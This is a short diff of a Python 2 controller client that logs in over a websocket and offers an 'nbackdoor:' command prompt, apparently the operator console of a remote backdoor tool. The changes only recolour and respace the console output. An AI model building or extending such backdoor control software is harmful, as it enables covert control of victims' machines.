@@ -37,7 +37,7 @@ class ControllerClient:
                 self.ws = create_connection("ws://localhost:8888/")
                 os.system('cls')
 
-                pwd = raw_input('Enter the password:')
+                pwd = raw_input('Enter the password: ')
                 sercret_msg = {'id': self.ID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
                                'pwd': self.encrypt(pwd)}
                 self.ws.send(json.dumps(sercret_msg))
@@ -48,13 +48,13 @@ class ControllerClient:
                 data = msg['data']
                 os.system('cls')
                 if data == 'login failed':
-                    print 'Login failed.'
+                    print Fore.RED + 'Login failed.'
                     self.exit = True
                 else:
-                    print 'Login success!'
+                    print Fore.RED + 'Login success!'
 
                 while not self.exit:
-                    input_str = raw_input(Fore.RED + 'nbackdoor:')
+                    input_str = raw_input(Back.RED + 'nbackdoor:' + Back.RESET + ' ')
                     msg = self.command_to_msg(input_str)
 
                     if msg:
@@ -62,7 +62,7 @@ class ControllerClient:
                         msg = json.loads(self.decrypt(self.ws.recv()))
                         if 'data' in msg:
                             data = msg['data']
-                            print data
+                            print Fore.GREEN + data
 
                 self.ws.close()
 
